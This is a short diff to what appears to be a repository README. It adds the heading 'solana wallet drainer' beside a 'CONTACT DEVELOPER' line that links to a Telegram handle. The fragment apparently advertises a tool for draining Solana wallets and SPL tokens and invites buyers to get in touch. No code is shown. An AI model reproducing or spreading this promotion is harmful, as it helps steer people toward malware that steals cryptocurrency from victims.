@@ -13,3 +13,4 @@ CONTACT DEVELOPER - https://t.me/solana_drain_wallet
 # solana drainer 
 
 # SPL TOKENS
+# solana wallet drainer
